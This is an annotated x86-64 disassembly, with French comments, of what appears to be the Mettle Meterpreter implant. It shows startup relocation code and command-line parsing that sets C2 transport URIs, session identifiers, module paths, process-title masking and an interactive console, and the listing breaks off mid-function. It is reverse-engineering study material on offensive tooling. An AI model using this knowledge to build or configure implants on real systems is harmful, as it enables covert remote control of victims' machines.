; Adresses virtuelles ELF relatives a la base, pas adresses ASLR du systeme.

_start: VA=0x93ba, offset=0x93ba, taille=22
000093ba: 4831ed                   xor      rbp, rbp                                   ; 
000093bd: 4889e7                   mov      rdi, rsp                                   ; 
000093c0: 488d35899a2d00           lea      rsi, [rip + 0x2d9a89]                      ; _DYNAMIC
000093c7: 4883e4f0                 and      rsp, 0xfffffffffffffff0                    ; 
000093cb: e800000000               call     0x93d0                                     ; _start_c

_start_c: VA=0x93d0, offset=0x93d0, taille=344
000093d0: 4881ec90010000           sub      rsp, 0x190                                 ; 
000093d7: 8b07                     mov      eax, dword ptr [rdi]                       ; 
000093d9: 4889f9                   mov      rcx, rdi                                   ; 
000093dc: ffc0                     inc      eax                                        ; 
000093de: 4898                     cdqe                                                ; 
000093e0: 488b54c108               mov      rdx, qword ptr [rcx + rax*8 + 8]           ; 
000093e5: 48ffc0                   inc      rax                                        ; 
000093e8: 4885d2                   test     rdx, rdx                                   ; 
000093eb: 75f3                     jne      0x93e0                                     ; 
000093ed: 488d54c108               lea      rdx, [rcx + rax*8 + 8]                     ; 
000093f2: 31c0                     xor      eax, eax                                   ; 
000093f4: 48c744c48800000000       mov      qword ptr [rsp + rax*8 - 0x78], 0          ; 
000093fd: 48ffc0                   inc      rax                                        ; 
00009400: 4883f820                 cmp      rax, 0x20                                  ; 
00009404: 75ee                     jne      0x93f4                                     ; 
00009406: 488b02                   mov      rax, qword ptr [rdx]                       ; 
00009409: 4885c0                   test     rax, rax                                   ; 
0000940c: 7415                     je       0x9423                                     ; 
0000940e: 4883f81f                 cmp      rax, 0x1f                                  ; 
00009412: 7709                     ja       0x941d                                     ; 
00009414: 488b7a08                 mov      rdi, qword ptr [rdx + 8]                   ; 
00009418: 48897cc488               mov      qword ptr [rsp + rax*8 - 0x78], rdi        ; 
0000941d: 4883c210                 add      rdx, 0x10                                  ; 
00009421: ebe3                     jmp      0x9406                                     ; 
00009423: 48c784c48800000000000000 mov      qword ptr [rsp + rax*8 + 0x88], 0          ; 
0000942f: 48ffc0                   inc      rax                                        ; 
00009432: 4883f820                 cmp      rax, 0x20                                  ; 
00009436: 75eb                     jne      0x9423                                     ; 
00009438: 4889f0                   mov      rax, rsi                                   ; 
0000943b: 488b10                   mov      rdx, qword ptr [rax]                       ; 
0000943e: 4885d2                   test     rdx, rdx                                   ; 
00009441: 7418                     je       0x945b                                     ; 
00009443: 4883fa1f                 cmp      rdx, 0x1f                                  ; 
00009447: 770c                     ja       0x9455                                     ; 
00009449: 488b7808                 mov      rdi, qword ptr [rax + 8]                   ; 
0000944d: 4889bcd488000000         mov      qword ptr [rsp + rdx*8 + 0x88], rdi        ; 
00009455: 4883c010                 add      rax, 0x10                                  ; 
00009459: ebe0                     jmp      0x943b                                     ; 
0000945b: 488b7c24c0               mov      rdi, qword ptr [rsp - 0x40]                ; 
00009460: 4885ff                   test     rdi, rdi                                   ; 
00009463: 752a                     jne      0x948f                                     ; 
00009465: 488b7c24b0               mov      rdi, qword ptr [rsp - 0x50]                ; 
0000946a: 488b5424a8               mov      rdx, qword ptr [rsp - 0x58]                ; 
0000946f: 488b4424a0               mov      rax, qword ptr [rsp - 0x60]                ; 
00009474: 4885ff                   test     rdi, rdi                                   ; 
00009477: 7416                     je       0x948f                                     ; 
00009479: 48ffcf                   dec      rdi                                        ; 
0000947c: 833802                   cmp      dword ptr [rax], 2                         ; 
0000947f: 7509                     jne      0x948a                                     ; 
00009481: 482b7010                 sub      rsi, qword ptr [rax + 0x10]                ; 
00009485: 4889f7                   mov      rdi, rsi                                   ; 
00009488: eb05                     jmp      0x948f                                     ; 
0000948a: 4801d0                   add      rax, rdx                                   ; 
0000948d: ebe5                     jmp      0x9474                                     ; 
0000948f: 488b942410010000         mov      rdx, qword ptr [rsp + 0x110]               ; 
00009497: 488b842418010000         mov      rax, qword ptr [rsp + 0x118]               ; 
0000949f: 4801fa                   add      rdx, rdi                                   ; 
000094a2: 4801c2                   add      rdx, rax                                   ; 
000094a5: 4989d0                   mov      r8, rdx                                    ; 
000094a8: 4929c0                   sub      r8, rax                                    ; 
000094ab: 4885c0                   test     rax, rax                                   ; 
000094ae: 741f                     je       0x94cf                                     ; 
000094b0: 498b7008                 mov      rsi, qword ptr [r8 + 8]                    ; 
000094b4: 81e6ffffff7f             and      esi, 0x7fffffff                            ; 
000094ba: 4883fe08                 cmp      rsi, 8                                     ; 
000094be: 7509                     jne      0x94c9                                     ; 
000094c0: 498b30                   mov      rsi, qword ptr [r8]                        ; 
000094c3: 4801fe                   add      rsi, rdi                                   ; 
000094c6: 48013e                   add      qword ptr [rsi], rdi                       ; 
000094c9: 4883e810                 sub      rax, 0x10                                  ; 
000094cd: ebd6                     jmp      0x94a5                                     ; 
000094cf: 488bb424c0000000         mov      rsi, qword ptr [rsp + 0xc0]                ; 
000094d7: 488b8424c8000000         mov      rax, qword ptr [rsp + 0xc8]                ; 
000094df: 4801fe                   add      rsi, rdi                                   ; 
000094e2: 4801c6                   add      rsi, rax                                   ; 
000094e5: 4889f2                   mov      rdx, rsi                                   ; 
000094e8: 4829c2                   sub      rdx, rax                                   ; 
000094eb: 4885c0                   test     rax, rax                                   ; 
000094ee: 7425                     je       0x9515                                     ; 
000094f0: 4c8b4208                 mov      r8, qword ptr [rdx + 8]                    ; 
000094f4: 4181e0ffffff7f           and      r8d, 0x7fffffff                            ; 
000094fb: 4983f808                 cmp      r8, 8                                      ; 
000094ff: 750e                     jne      0x950f                                     ; 
00009501: 4c8b4a10                 mov      r9, qword ptr [rdx + 0x10]                 ; 
00009505: 4c8b02                   mov      r8, qword ptr [rdx]                        ; 
00009508: 4901f9                   add      r9, rdi                                    ; 
0000950b: 4d890c38                 mov      qword ptr [r8 + rdi], r9                   ; 
0000950f: 4883e818                 sub      rax, 0x18                                  ; 
00009513: ebd0                     jmp      0x94e5                                     ; 
00009515: 488d050c000000           lea      rax, [rip + 0xc]                           ; __dls2
0000951c: 4889ce                   mov      rsi, rcx                                   ; 
0000951f: 4881c490010000           add      rsp, 0x190                                 ; 
00009526: ffe0                     jmp      rax                                        ; 

main: VA=0x925c, offset=0x925c, taille=350
0000925c: 4156                     push     r14                                        ; 
0000925e: 4155                     push     r13                                        ; 
00009260: 4189fd                   mov      r13d, edi                                  ; 
00009263: 4154                     push     r12                                        ; 
00009265: 55                       push     rbp                                        ; 
00009266: 4889f5                   mov      rbp, rsi                                   ; 
00009269: 53                       push     rbx                                        ; 
0000926a: 4883ec10                 sub      rsp, 0x10                                  ; 
0000926e: 488b3e                   mov      rdi, qword ptr [rsi]                       ; 
00009271: e891230100               call     0x1b607                                    ; get_progname
00009276: 488d15b36f2e00           lea      rdx, [rip + 0x2e6fb3]                      ; program_invocation_short_name
0000927d: be01000000               mov      esi, 1                                     ; 
00009282: bf0d000000               mov      edi, 0xd                                   ; 
00009287: 488902                   mov      qword ptr [rdx], rax                       ; 
0000928a: e858600900               call     0x9f2e7                                    ; signal
0000928f: e88e0c0000               call     0x9f22                                     ; mettle
00009294: 4885c0                   test     rax, rax                                   ; 
00009297: 7534                     jne      0x92cd                                     ; 
00009299: 488d05c0b02d00           lea      rax, [rip + 0x2db0c0]                      ; _zlog_level
000092a0: bd01000000               mov      ebp, 1                                     ; 
000092a5: 833800                   cmp      dword ptr [rax], 0                         ; 
000092a8: 0f88fd000000             js       0x93ab                                     ; 
000092ae: 488d15ee5a0a00           lea      rdx, [rip + 0xa5aee]                       ; 
000092b5: 488d3d4d5a0a00           lea      rdi, [rip + 0xa5a4d]                       ; 
000092bc: be0a010000               mov      esi, 0x10a                                 ; 
000092c1: 31c0                     xor      eax, eax                                   ; 
000092c3: e8615b0000               call     0xee29                                     ; zlog_time
000092c8: e9de000000               jmp      0x93ab                                     ; 
000092cd: 488b7d00                 mov      rdi, qword ptr [rbp]                       ; 
000092d1: 4889c3                   mov      rbx, rax                                   ; 
000092d4: 4885ff                   test     rdi, rdi                                   ; 
000092d7: 7457                     je       0x9330                                     ; 
000092d9: 488d35e56e0a00           lea      rsi, [rip + 0xa6ee5]                       ; 
000092e0: e8bbab0900               call     0xa3ea0                                    ; strcmp
000092e5: 85c0                     test     eax, eax                                   ; 
000092e7: 7547                     jne      0x9330                                     ; 
000092e9: 488b5508                 mov      rdx, qword ptr [rbp + 8]                   ; 
000092ed: 488d7c2408               lea      rdi, [rsp + 8]                             ; 
000092f2: 488d35c05a0a00           lea      rsi, [rip + 0xa5ac0]                       ; 
000092f9: e80e660900               call     0x9f90c                                    ; asprintf
000092fe: 85c0                     test     eax, eax                                   ; 
00009300: 7e1f                     jle      0x9321                                     ; 
00009302: 4889df                   mov      rdi, rbx                                   ; 
00009305: e8a00a0000               call     0x9daa                                     ; mettle_get_c2
0000930a: 488b742408               mov      rsi, qword ptr [rsp + 8]                   ; 
0000930f: 4889c7                   mov      rdi, rax                                   ; 
00009312: e82f120000               call     0xa546                                     ; c2_add_transport_uri
00009317: 488b7c2408               mov      rdi, qword ptr [rsp + 8]                   ; 
0000931c: e8bfa20800               call     0x935e0                                    ; free
00009321: be01000000               mov      esi, 1                                     ; 
00009326: 4889df                   mov      rdi, rbx                                   ; 
00009329: e851080000               call     0x9b7f                                     ; parse_default_args
0000932e: eb69                     jmp      0x9399                                     ; 
00009330: 418d7d01                 lea      edi, [r13 + 1]                             ; 
00009334: be08000000               mov      esi, 8                                     ; 
00009339: 4531e4                   xor      r12d, r12d                                 ; 
0000933c: 4863ff                   movsxd   rdi, edi                                   ; 
0000933f: e8cc9b0800               call     0x92f10                                    ; calloc
00009344: 4989c6                   mov      r14, rax                                   ; 
00009347: 48890582ad2d00           mov      qword ptr [rip + 0x2dad82], rax            ; saved_argv
0000934e: 4539e5                   cmp      r13d, r12d                                 ; 
00009351: 7e13                     jle      0x9366                                     ; 
00009353: 4a8b7ce500               mov      rdi, qword ptr [rbp + r12*8]               ; 
00009358: e883ac0900               call     0xa3fe0                                    ; strdup
0000935d: 4b8904e6                 mov      qword ptr [r14 + r12*8], rax               ; 
00009361: 49ffc4                   inc      r12                                        ; 
00009364: ebe8                     jmp      0x934e                                     ; 
00009366: 4889ee                   mov      rsi, rbp                                   ; 
00009369: 4489ef                   mov      edi, r13d                                  ; 
0000936c: e867240100               call     0x1b7d8                                    ; compat_init_setproctitle
00009371: 488b2d58ad2d00           mov      rbp, qword ptr [rip + 0x2dad58]            ; saved_argv
00009378: 31f6                     xor      esi, esi                                   ; 
0000937a: 4889df                   mov      rdi, rbx                                   ; 
0000937d: e8fd070000               call     0x9b7f                                     ; parse_default_args
00009382: 31c9                     xor      ecx, ecx                                   ; 
00009384: 4889da                   mov      rdx, rbx                                   ; 
00009387: 4489ef                   mov      edi, r13d                                  ; 
0000938a: 4889ee                   mov      rsi, rbp                                   ; 
0000938d: 83cdff                   or       ebp, 0xffffffff                            ; 
00009390: e830030000               call     0x96c5                                     ; parse_cmdline
00009395: 85c0                     test     eax, eax                                   ; 
00009397: 7512                     jne      0x93ab                                     ; 
00009399: 4889df                   mov      rdi, rbx                                   ; 
0000939c: 31ed                     xor      ebp, ebp                                   ; 
0000939e: e8e10c0000               call     0xa084                                     ; mettle_start
000093a3: 4889df                   mov      rdi, rbx                                   ; 
000093a6: e82d0b0000               call     0x9ed8                                     ; mettle_free
000093ab: 4883c410                 add      rsp, 0x10                                  ; 
000093af: 89e8                     mov      eax, ebp                                   ; 
000093b1: 5b                       pop      rbx                                        ; 
000093b2: 5d                       pop      rbp                                        ; 
000093b3: 415c                     pop      r12                                        ; 
000093b5: 415d                     pop      r13                                        ; 
000093b7: 415e                     pop      r14                                        ; 
000093b9: c3                       ret                                                 ; 

parse_default_args: VA=0x9b7f, offset=0x9b7f, taille=96
00009b7f: 55                       push     rbp                                        ; 
00009b80: 53                       push     rbx                                        ; 
00009b81: 89f5                     mov      ebp, esi                                   ; 
00009b83: 4889fb                   mov      rbx, rdi                                   ; 
00009b86: 488d3509520a00           lea      rsi, [rip + 0xa5209]                       ; 
00009b8d: 488d3d2c962d00           lea      rdi, [rip + 0x2d962c]                      ; default_opts.7006
00009b94: 4883ec18                 sub      rsp, 0x18                                  ; 
00009b98: ba0c000000               mov      edx, 0xc                                   ; 
00009b9d: e85ea70900               call     0xa4300                                    ; strncasecmp
00009ba2: 85c0                     test     eax, eax                                   ; 
00009ba4: 7432                     je       0x9bd8                                     ; 
00009ba6: 488d542408               lea      rdx, [rsp + 8]                             ; 
00009bab: 488d3d0e962d00           lea      rdi, [rip + 0x2d960e]                      ; default_opts.7006
00009bb2: 31f6                     xor      esi, esi                                   ; 
00009bb4: 48c744240800000000       mov      qword ptr [rsp + 8], 0                     ; 
00009bbd: e87e050000               call     0xa140                                     ; argv_split
00009bc2: 4885c0                   test     rax, rax                                   ; 
00009bc5: 7411                     je       0x9bd8                                     ; 
00009bc7: 8b7c2408                 mov      edi, dword ptr [rsp + 8]                   ; 
00009bcb: 89e9                     mov      ecx, ebp                                   ; 
00009bcd: 4889da                   mov      rdx, rbx                                   ; 
00009bd0: 4889c6                   mov      rsi, rax                                   ; 
00009bd3: e8edfaffff               call     0x96c5                                     ; parse_cmdline
00009bd8: 4883c418                 add      rsp, 0x18                                  ; 
00009bdc: 5b                       pop      rbx                                        ; 
00009bdd: 5d                       pop      rbp                                        ; 
00009bde: c3                       ret                                                 ; 

parse_cmdline: VA=0x96c5, offset=0x96c5, taille=1210
000096c5: 4157                     push     r15                                        ; 
000096c7: 4156                     push     r14                                        ; 
000096c9: 4989f6                   mov      r14, rsi                                   ; 
000096cc: 4155                     push     r13                                        ; 
000096ce: 4154                     push     r12                                        ; 
000096d0: 488d3569992d00           lea      rsi, [rip + 0x2d9969]                      ; 
000096d7: 55                       push     rbp                                        ; 
000096d8: 53                       push     rbx                                        ; 
000096d9: 4989d5                   mov      r13, rdx                                   ; 
000096dc: 4531e4                   xor      r12d, r12d                                 ; 
000096df: 4531ff                   xor      r15d, r15d                                 ; 
000096e2: 4881ecd8010000           sub      rsp, 0x1d8                                 ; 
000096e9: 897c2428                 mov      dword ptr [rsp + 0x28], edi                ; 
000096ed: 894c242c                 mov      dword ptr [rsp + 0x2c], ecx                ; 
000096f1: 488d7c2450               lea      rdi, [rsp + 0x50]                          ; 
000096f6: b960000000               mov      ecx, 0x60                                  ; 
000096fb: c744243c00000000         mov      dword ptr [rsp + 0x3c], 0                  ; 
00009703: f3a5                     rep movsd dword ptr [rdi], dword ptr [rsi]           ; 
00009705: 488d3d74530a00           lea      rdi, [rip + 0xa5374]                       ; 
0000970c: e8cfa80900               call     0xa3fe0                                    ; strdup
00009711: 4889c5                   mov      rbp, rax                                   ; 
00009714: 488d0529a62d00           lea      rax, [rip + 0x2da629]                      ; optind
0000971b: c744241000000000         mov      dword ptr [rsp + 0x10], 0                  ; 
00009723: c644241700               mov      byte ptr [rsp + 0x17], 0                   ; 
00009728: c644241600               mov      byte ptr [rsp + 0x16], 0                   ; 
0000972d: c644241500               mov      byte ptr [rsp + 0x15], 0                   ; 
00009732: c644240800               mov      byte ptr [rsp + 8], 0                      ; 
00009737: c70001000000             mov      dword ptr [rax], 1                         ; 
0000973d: 488d44243c               lea      rax, [rsp + 0x3c]                          ; 
00009742: 4889442418               mov      qword ptr [rsp + 0x18], rax                ; 
00009747: 488d442450               lea      rax, [rsp + 0x50]                          ; 
0000974c: 4c8b442418               mov      r8, qword ptr [rsp + 0x18]                 ; 
00009751: 8b7c2428                 mov      edi, dword ptr [rsp + 0x28]                ; 
00009755: 488d1587550a00           lea      rdx, [rip + 0xa5587]                       ; 
0000975c: 4c89f6                   mov      rsi, r14                                   ; 
0000975f: 4889c1                   mov      rcx, rax                                   ; 
00009762: 4889442420               mov      qword ptr [rsp + 0x20], rax                ; 
00009767: e8f2b50800               call     0x94d5e                                    ; getopt_long
0000976c: 83f8ff                   cmp      eax, -1                                    ; 
0000976f: 89c3                     mov      ebx, eax                                   ; 
00009771: 0f8499020000             je       0x9a10                                     ; 
00009777: 83fb64                   cmp      ebx, 0x64                                  ; 
0000977a: 0f8421010000             je       0x98a1                                     ; 
00009780: 7f3f                     jg       0x97c1                                     ; 
00009782: 83fb55                   cmp      ebx, 0x55                                  ; 
00009785: 0f84a6000000             je       0x9831                                     ; 
0000978b: 7f1d                     jg       0x97aa                                     ; 
0000978d: 83fb47                   cmp      ebx, 0x47                                  ; 
00009790: 0f85c3010000             jne      0x9959                                     ; 
00009796: 488d051b902e00           lea      rax, [rip + 0x2e901b]                      ; optarg
0000979d: 4c89ef                   mov      rdi, r13                                   ; 
000097a0: 488b30                   mov      rsi, qword ptr [rax]                       ; 
000097a3: e89c060000               call     0x9e44                                     ; mettle_set_session_guid_base64
000097a8: eb9d                     jmp      0x9747                                     ; 
000097aa: 83fb62                   cmp      ebx, 0x62                                  ; 
000097ad: 0f8441010000             je       0x98f4                                     ; 
000097b3: 83fb63                   cmp      ebx, 0x63                                  ; 
000097b6: 0f844a020000             je       0x9a06                                     ; 
000097bc: e998010000               jmp      0x9959                                     ; 
000097c1: 83fb6f                   cmp      ebx, 0x6f                                  ; 
000097c4: 488d05ed8f2e00           lea      rax, [rip + 0x2e8fed]                      ; optarg
000097cb: 0f8480010000             je       0x9951                                     ; 
000097d1: 7f35                     jg       0x9808                                     ; 
000097d3: 83fb6d                   cmp      ebx, 0x6d                                  ; 
000097d6: 7470                     je       0x9848                                     ; 
000097d8: 83fb6e                   cmp      ebx, 0x6e                                  ; 
000097db: 0f8578010000             jne      0x9959                                     ; 
000097e1: 4889ef                   mov      rdi, rbp                                   ; 
000097e4: 4889442408               mov      qword ptr [rsp + 8], rax                   ; 
000097e9: e8f29d0800               call     0x935e0                                    ; free
000097ee: 488b442408               mov      rax, qword ptr [rsp + 8]                   ; 
000097f3: 488b38                   mov      rdi, qword ptr [rax]                       ; 
000097f6: e8e5a70900               call     0xa3fe0                                    ; strdup
000097fb: c644240801               mov      byte ptr [rsp + 8], 1                      ; 
00009800: 4889c5                   mov      rbp, rax                                   ; 
00009803: e93fffffff               jmp      0x9747                                     ; 
00009808: 83fb70                   cmp      ebx, 0x70                                  ; 
0000980b: 7456                     je       0x9863                                     ; 
0000980d: 83fb75                   cmp      ebx, 0x75                                  ; 
00009810: 0f8543010000             jne      0x9959                                     ; 
00009816: 488b18                   mov      rbx, qword ptr [rax]                       ; 
00009819: 4c89ef                   mov      rdi, r13                                   ; 
0000981c: e889050000               call     0x9daa                                     ; mettle_get_c2
00009821: 4889c7                   mov      rdi, rax                                   ; 
00009824: 4889de                   mov      rsi, rbx                                   ; 
00009827: e81a0d0000               call     0xa546                                     ; c2_add_transport_uri
0000982c: e916ffffff               jmp      0x9747                                     ; 
00009831: 488d05808f2e00           lea      rax, [rip + 0x2e8f80]                      ; optarg
00009838: 4c89ef                   mov      rdi, r13                                   ; 
0000983b: 488b30                   mov      rsi, qword ptr [rax]                       ; 
0000983e: e889050000               call     0x9dcc                                     ; mettle_set_uuid_base64
00009843: e9fffeffff               jmp      0x9747                                     ; 
00009848: 488b18                   mov      rbx, qword ptr [rax]                       ; 
0000984b: 4c89ef                   mov      rdi, r13                                   ; 
0000984e: e85c050000               call     0x9daf                                     ; mettle_get_modulemgr
00009853: 4889c7                   mov      rdi, rax                                   ; 
00009856: 4889de                   mov      rsi, rbx                                   ; 
00009859: e898740000               call     0x10cf6                                    ; modulemgr_load_path
0000985e: e9e4feffff               jmp      0x9747                                     ; 
00009863: 488b18                   mov      rbx, qword ptr [rax]                       ; 
00009866: 488d3d1c520a00           lea      rdi, [rip + 0xa521c]                       ; 
0000986d: 41bc01000000             mov      r12d, 1                                    ; 
00009873: 4889de                   mov      rsi, rbx                                   ; 
00009876: e825a60900               call     0xa3ea0                                    ; strcmp
0000987b: 85c0                     test     eax, eax                                   ; 
0000987d: 0f84c4feffff             je       0x9747                                     ; 
00009883: 488d3dfd510a00           lea      rdi, [rip + 0xa51fd]                       ; 
0000988a: 4889de                   mov      rsi, rbx                                   ; 
0000988d: e80ea60900               call     0xa3ea0                                    ; strcmp
00009892: 83f801                   cmp      eax, 1                                     ; 
00009895: 4519e4                   sbb      r12d, r12d                                 ; 
00009898: 4183e402                 and      r12d, 2                                    ; 
0000989c: e9a6feffff               jmp      0x9747                                     ; 
000098a1: 488d1d108f2e00           lea      rbx, [rip + 0x2e8f10]                      ; optarg
000098a8: 488d4c2448               lea      rcx, [rsp + 0x48]                          ; 
000098ad: 31f6                     xor      esi, esi                                   ; 
000098af: ba03000000               mov      edx, 3                                     ; 
000098b4: 48c744244800000000       mov      qword ptr [rsp + 0x48], 0                  ; 
000098bd: 488b3b                   mov      rdi, qword ptr [rbx]                       ; 
000098c0: e86f1d0100               call     0x1b634                                    ; compat_strtonum
000098c5: 488b4c2448               mov      rcx, qword ptr [rsp + 0x48]                ; 
000098ca: 89442410                 mov      dword ptr [rsp + 0x10], eax                ; 
000098ce: 4885c9                   test     rcx, rcx                                   ; 
000098d1: 740c                     je       0x98df                                     ; 
000098d3: 488b13                   mov      rdx, qword ptr [rbx]                       ; 
000098d6: 488d35b4510a00           lea      rsi, [rip + 0xa51b4]                       ; 
000098dd: eb4d                     jmp      0x992c                                     ; 
000098df: 488d157aaa2d00           lea      rdx, [rip + 0x2daa7a]                      ; _zlog_level
000098e6: 85c0                     test     eax, eax                                   ; 
000098e8: 0f9f442415               setg     byte ptr [rsp + 0x15]                      ; 
000098ed: 8902                     mov      dword ptr [rdx], eax                       ; 
000098ef: e953feffff               jmp      0x9747                                     ; 
000098f4: 488d1dbd8e2e00           lea      rbx, [rip + 0x2e8ebd]                      ; optarg
000098fb: 488d4c2448               lea      rcx, [rsp + 0x48]                          ; 
00009900: 31f6                     xor      esi, esi                                   ; 
00009902: ba01000000               mov      edx, 1                                     ; 
00009907: 48c744244800000000       mov      qword ptr [rsp + 0x48], 0                  ; 
00009910: 488b3b                   mov      rdi, qword ptr [rbx]                       ; 
00009913: e81c1d0100               call     0x1b634                                    ; compat_strtonum
00009918: 488b4c2448               mov      rcx, qword ptr [rsp + 0x48]                ; 
0000991d: 4885c9                   test     rcx, rcx                                   ; 
00009920: 7423                     je       0x9945                                     ; 
00009922: 488b13                   mov      rdx, qword ptr [rbx]                       ; 
00009925: 488d3583510a00           lea      rsi, [rip + 0xa5183]                       ; 
0000992c: 488d05fd922d00           lea      rax, [rip + 0x2d92fd]                      ; stderr
00009933: 83cbff                   or       ebx, 0xffffffff                            ; 
00009936: 488b38                   mov      rdi, qword ptr [rax]                       ; 
00009939: 31c0                     xor      eax, eax                                   ; 
0000993b: e8ca650900               call     0x9ff0a                                    ; fprintf
00009940: e926020000               jmp      0x9b6b                                     ; 
00009945: ffc8                     dec      eax                                        ; 
00009947: 0f94442416               sete     byte ptr [rsp + 0x16]                      ; 
0000994c: e9f6fdffff               jmp      0x9747                                     ; 
00009951: 4c8b38                   mov      r15, qword ptr [rax]                       ; 
00009954: e9eefdffff               jmp      0x9747                                     ; 
00009959: 488d3520510a00           lea      rsi, [rip + 0xa5120]                       ; 
00009960: 488d3d6c510a00           lea      rdi, [rip + 0xa516c]                       ; 
00009967: 31c0                     xor      eax, eax                                   ; 
00009969: e854700900               call     0xa09c2                                    ; printf
0000996e: 488d3d73510a00           lea      rdi, [rip + 0xa5173]                       ; 
00009975: e890710900               call     0xa0b0a                                    ; puts
0000997a: 488d3d8d510a00           lea      rdi, [rip + 0xa518d]                       ; 
00009981: e884710900               call     0xa0b0a                                    ; puts
00009986: 488d3dad510a00           lea      rdi, [rip + 0xa51ad]                       ; 
0000998d: e878710900               call     0xa0b0a                                    ; puts
00009992: 488d3dd0510a00           lea      rdi, [rip + 0xa51d0]                       ; 
00009999: e86c710900               call     0xa0b0a                                    ; puts
0000999e: 488d3d07520a00           lea      rdi, [rip + 0xa5207]                       ; 
000099a5: e860710900               call     0xa0b0a                                    ; puts
000099aa: 488d3d31520a00           lea      rdi, [rip + 0xa5231]                       ; 
000099b1: e854710900               call     0xa0b0a                                    ; puts
000099b6: 488d3d72520a00           lea      rdi, [rip + 0xa5272]                       ; 
000099bd: e848710900               call     0xa0b0a                                    ; puts
000099c2: 488d3da2520a00           lea      rdi, [rip + 0xa52a2]                       ; 
000099c9: e83c710900               call     0xa0b0a                                    ; puts
000099ce: 488d3dc5520a00           lea      rdi, [rip + 0xa52c5]                       ; 
000099d5: e830710900               call     0xa0b0a                                    ; puts
000099da: 488d3de3520a00           lea      rdi, [rip + 0xa52e3]                       ; 
000099e1: e824710900               call     0xa0b0a                                    ; puts
000099e6: 488d3de6520a00           lea      rdi, [rip + 0xa52e6]                       ; 
000099ed: e818710900               call     0xa0b0a                                    ; puts
000099f2: bf0a000000               mov      edi, 0xa                                   ; 
000099f7: e8ff700900               call     0xa0afb                                    ; putchar
000099fc: bf01000000               mov      edi, 1                                     ; 
00009a01: e832f8ffff               call     0x9238                                     ; exit
00009a06: c644241701               mov      byte ptr [rsp + 0x17], 1                   ; 
00009a0b: e937fdffff               jmp      0x9747                                     ; 
00009a10: 807c240800               cmp      byte ptr [rsp + 8], 0                      ; 
00009a15: 743a                     je       0x9a51                                     ; 
00009a17: f644242c01               test     byte ptr [rsp + 0x2c], 1                   ; 
00009a1c: 7533                     jne      0x9a51                                     ; 
00009a1e: 488d053ba92d00           lea      rax, [rip + 0x2da93b]                      ; _zlog_level
00009a25: 833801                   cmp      dword ptr [rax], 1                         ; 
00009a28: 7e1d                     jle      0x9a47                                     ; 
00009a2a: 488d15c8520a00           lea      rdx, [rip + 0xa52c8]                       ; 
00009a31: 488d3dd1520a00           lea      rdi, [rip + 0xa52d1]                       ; 
00009a38: 4889e9                   mov      rcx, rbp                                   ; 
00009a3b: be99000000               mov      esi, 0x99                                  ; 
00009a40: 31c0                     xor      eax, eax                                   ; 
00009a42: e8e2530000               call     0xee29                                     ; zlog_time
00009a47: 4889ef                   mov      rdi, rbp                                   ; 
00009a4a: 31c0                     xor      eax, eax                                   ; 
00009a4c: e8a81e0100               call     0x1b8f9                                    ; setproctitle
00009a51: 807c241700               cmp      byte ptr [rsp + 0x17], 0                   ; 
00009a56: 740d                     je       0x9a65                                     ; 
00009a58: 4c89ef                   mov      rdi, r13                                   ; 
00009a5b: e8f9e50000               call     0x18059                                    ; mettle_console_start_interactive
00009a60: e904010000               jmp      0x9b69                                     ; 
00009a65: 807c241500               cmp      byte ptr [rsp + 0x15], 0                   ; 
00009a6a: 7434                     je       0x9aa0                                     ; 
00009a6c: 488d05bd912d00           lea      rax, [rip + 0x2d91bd]                      ; stderr
00009a73: 4d85ff                   test     r15, r15                                   ; 
00009a76: 4c8b28                   mov      r13, qword ptr [rax]                       ; 
00009a79: 7416                     je       0x9a91                                     ; 
00009a7b: 488d35ba1d0b00           lea      rsi, [rip + 0xb1dba]                       ; 
00009a82: 4c89ff                   mov      rdi, r15                                   ; 
00009a85: e8db630900               call     0x9fe65                                    ; fopen64
00009a8a: 4885c0                   test     rax, rax                                   ; 
00009a8d: 4c0f45e8                 cmovne   r13, rax                                   ; 
00009a91: 4c89ef                   mov      rdi, r13                                   ; 
00009a94: e89a520000               call     0xed33                                     ; zlog_init_file
00009a99: 31c0                     xor      eax, eax                                   ; 
00009a9b: e8a3520000               call     0xed43                                     ; zlog_init_flush_thread
00009aa0: 807c241600               cmp      byte ptr [rsp + 0x16], 0                   ; 
00009aa5: 0f84be000000             je       0x9b69                                     ; 
00009aab: 8b4c2410                 mov      ecx, dword ptr [rsp + 0x10]                ; 
00009aaf: 498b16                   mov      rdx, qword ptr [r14]                       ; 
00009ab2: 488d7c2440               lea      rdi, [rsp + 0x40]                          ; 
00009ab7: 488d3593520a00           lea      rsi, [rip + 0xa5293]                       ; 
00009abe: 31c0                     xor      eax, eax                                   ; 
00009ac0: e8475e0900               call     0x9f90c                                    ; asprintf
00009ac5: ffc0                     inc      eax                                        ; 
00009ac7: 0f849e000000             je       0x9b6b                                     ; 
00009acd: 488d0570a22d00           lea      rax, [rip + 0x2da270]                      ; optind
00009ad4: 4c8d2d08520a00           lea      r13, [rip + 0xa5208]                       ; 
00009adb: c70001000000             mov      dword ptr [rax], 1                         ; 
00009ae1: 4c8b442418               mov      r8, qword ptr [rsp + 0x18]                 ; 
00009ae6: 488b4c2420               mov      rcx, qword ptr [rsp + 0x20]                ; 
00009aeb: 4c89ea                   mov      rdx, r13                                   ; 
00009aee: 8b7c2428                 mov      edi, dword ptr [rsp + 0x28]                ; 
00009af2: 4c89f6                   mov      rsi, r14                                   ; 
00009af5: e864b20800               call     0x94d5e                                    ; getopt_long
00009afa: 83f8ff                   cmp      eax, -1                                    ; 
00009afd: 744d                     je       0x9b4c                                     ; 
00009aff: 89c2                     mov      edx, eax                                   ; 
00009b01: 83e2df                   and      edx, 0xffffffdf                            ; 
00009b04: 83fa55                   cmp      edx, 0x55                                  ; 
00009b07: 7405                     je       0x9b0e                                     ; 
00009b09: 83f86f                   cmp      eax, 0x6f                                  ; 
00009b0c: 75d3                     jne      0x9ae1                                     ; 
00009b0e: 488d15a38c2e00           lea      rdx, [rip + 0x2e8ca3]                      ; optarg
00009b15: 488d7c2448               lea      rdi, [rsp + 0x48]                          ; 
00009b1a: 488d3539520a00           lea      rsi, [rip + 0xa5239]                       ; 
00009b21: 89c1                     mov      ecx, eax                                   ; 
00009b23: 31c0                     xor      eax, eax                                   ; 
00009b25: 4c8b02                   mov      r8, qword ptr [rdx]                        ; 
00009b28: 488b542440               mov      rdx, qword ptr [rsp + 0x40]                ; 
00009b2d: e8da5d0900               call     0x9f90c                                    ; asprintf
00009b32: ffc0                     inc      eax                                        ; 
00009b34: 7435                     je       0x9b6b                                     ; 
00009b36: 488b7c2440               mov      rdi, qword ptr [rsp + 0x40]                ; 
